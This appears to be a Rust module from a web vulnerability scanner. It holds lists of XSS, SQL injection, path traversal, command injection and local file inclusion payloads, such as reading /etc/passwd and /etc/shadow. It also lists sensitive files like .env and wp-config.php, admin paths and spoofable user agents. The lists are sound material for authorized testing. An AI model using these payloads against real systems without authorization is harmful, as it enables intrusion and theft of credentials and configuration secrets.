#![allow(dead_code)]
use std::collections::HashMap;

pub struct PayloadLibrary;

impl PayloadLibrary {
    pub fn xss_payloads() -> Vec<String> {
        vec![
            "<script>alert(1)</script>".to_string(),
            "<img src=x onerror=alert(1)>".to_string(),
            "<svg onload=alert(1)>".to_string(),
            "javascript:alert(1)".to_string(),
            "<iframe src=javascript:alert(1)>".to_string(),
            "<body onload=alert(1)>".to_string(),
            "<input autofocus onfocus=alert(1)>".to_string(),
            "\"><script>alert(1)</script>".to_string(),
            "'><script>alert(1)</script>".to_string(),
            "<img src=\"x\" onerror=\"alert(1)\">".to_string(),
        ]
    }
    
    pub fn sql_injection_payloads() -> Vec<String> {
        vec![
            "' OR '1'='1".to_string(),
            "\" OR \"1\"=\"1".to_string(),
            "' OR '1'='1' --".to_string(),
            "admin' --".to_string(),
            "admin' #".to_string(),
            "' OR 1=1--".to_string(),
            "\" OR 1=1--".to_string(),
            "' UNION SELECT NULL--".to_string(),
            "1' AND '1'='1".to_string(),
            "1' AND '1'='2".to_string(),
        ]
    }
    
    pub fn path_traversal_payloads() -> Vec<String> {
        vec![
            "../".to_string(),
            "..\\".to_string(),
            "../../".to_string(),
            "..%2f".to_string(),
            "..%5c".to_string(),
            "....//".to_string(),
            "....\\\\".to_string(),
            "../../../../../etc/passwd".to_string(),
            "..\\..\\..\\..\\..\\windows\\win.ini".to_string(),
            "%2e%2e%2f".to_string(),
        ]
    }
    
    pub fn command_injection_payloads() -> Vec<String> {
        vec![
            "; ls".to_string(),
            "| ls".to_string(),
            "& ls".to_string(),
            "&& ls".to_string(),
            "|| ls".to_string(),
            "; cat /etc/passwd".to_string(),
            "| cat /etc/passwd".to_string(),
            "`cat /etc/passwd`".to_string(),
            "$(cat /etc/passwd)".to_string(),
            "; whoami".to_string(),
        ]
    }
    
    pub fn lfi_payloads() -> Vec<String> {
        vec![
            "/etc/passwd".to_string(),
            "/etc/shadow".to_string(),
            "/etc/hosts".to_string(),
            "/proc/self/environ".to_string(),
            "/var/log/apache2/access.log".to_string(),
            "C:\\Windows\\System32\\drivers\\etc\\hosts".to_string(),
            "C:\\Windows\\win.ini".to_string(),
            "/var/www/html/index.php".to_string(),
            "../../../etc/passwd".to_string(),
            "php://filter/convert.base64-encode/resource=index.php".to_string(),
        ]
    }
    
    pub fn common_files() -> Vec<String> {
        vec![
            "robots.txt".to_string(),
            "sitemap.xml".to_string(),
            ".git/HEAD".to_string(),
            ".env".to_string(),
            ".htaccess".to_string(),
            "web.config".to_string(),
            "composer.json".to_string(),
            "package.json".to_string(),
            "readme.md".to_string(),
            "config.php".to_string(),
            "wp-config.php".to_string(),
            "database.yml".to_string(),
            ".DS_Store".to_string(),
            "phpinfo.php".to_string(),
            "info.php".to_string(),
        ]
    }
    
    pub fn common_directories() -> Vec<String> {
        vec![
            "admin".to_string(),
            "administrator".to_string(),
            "api".to_string(),
            "backup".to_string(),
            "config".to_string(),
            "dashboard".to_string(),
            "dev".to_string(),
            "images".to_string(),
            "includes".to_string(),
            "js".to_string(),
            "login".to_string(),
            "panel".to_string(),
            "test".to_string(),
            "tmp".to_string(),
            "upload".to_string(),
            "uploads".to_string(),
            "user".to_string(),
            "users".to_string(),
            "wp-admin".to_string(),
            "wp-content".to_string(),
        ]
    }
    
    pub fn common_parameters() -> Vec<String> {
        vec![
            "id".to_string(),
            "page".to_string(),
            "file".to_string(),
            "path".to_string(),
            "url".to_string(),
            "redirect".to_string(),
            "debug".to_string(),
            "lang".to_string(),
            "user".to_string(),
            "username".to_string(),
            "password".to_string(),
            "email".to_string(),
            "search".to_string(),
            "query".to_string(),
            "cmd".to_string(),
            "exec".to_string(),
            "action".to_string(),
            "view".to_string(),
            "category".to_string(),
            "order".to_string(),
        ]
    }
    
    pub fn http_methods() -> Vec<String> {
        vec![
            "GET".to_string(),
            "POST".to_string(),
            "PUT".to_string(),
            "DELETE".to_string(),
            "PATCH".to_string(),
            "HEAD".to_string(),
            "OPTIONS".to_string(),
            "TRACE".to_string(),
            "CONNECT".to_string(),
            "PROPFIND".to_string(),
        ]
    }
    
    pub fn user_agents() -> Vec<String> {
        vec![
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36".to_string(),
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36".to_string(),
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36".to_string(),
            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_7_1 like Mac OS X)".to_string(),
            "Mozilla/5.0 (iPad; CPU OS 14_7_1 like Mac OS X)".to_string(),
            "Googlebot/2.1 (+http://www.google.com/bot.html)".to_string(),
            "Mozilla/5.0 (compatible; bingbot/2.0)".to_string(),
            "curl/7.79.1".to_string(),
            "python-requests/2.26.0".to_string(),
            "Wget/1.21.2".to_string(),
        ]
    }
    
    pub fn get_payload_category(category: &str) -> Option<Vec<String>> {
        match category.to_lowercase().as_str() {
            "xss" => Some(Self::xss_payloads()),
            "sqli" | "sql" => Some(Self::sql_injection_payloads()),
            "lfi" => Some(Self::lfi_payloads()),
            "traversal" | "path" => Some(Self::path_traversal_payloads()),
            "cmdi" | "command" => Some(Self::command_injection_payloads()),
            "files" => Some(Self::common_files()),
            "dirs" | "directories" => Some(Self::common_directories()),
            "params" | "parameters" => Some(Self::common_parameters()),
            "methods" => Some(Self::http_methods()),
            "useragents" | "ua" => Some(Self::user_agents()),
            _ => None,
        }
    }
    
    pub fn all_categories() -> HashMap<String, Vec<String>> {
        let mut map = HashMap::new();
        map.insert("xss".to_string(), Self::xss_payloads());
        map.insert("sqli".to_string(), Self::sql_injection_payloads());
        map.insert("lfi".to_string(), Self::lfi_payloads());
        map.insert("traversal".to_string(), Self::path_traversal_payloads());
        map.insert("cmdi".to_string(), Self::command_injection_payloads());
        map.insert("files".to_string(), Self::common_files());
        map.insert("directories".to_string(), Self::common_directories());
        map.insert("parameters".to_string(), Self::common_parameters());
        map.insert("methods".to_string(), Self::http_methods());
        map.insert("useragents".to_string(), Self::user_agents());
        map
    }
}
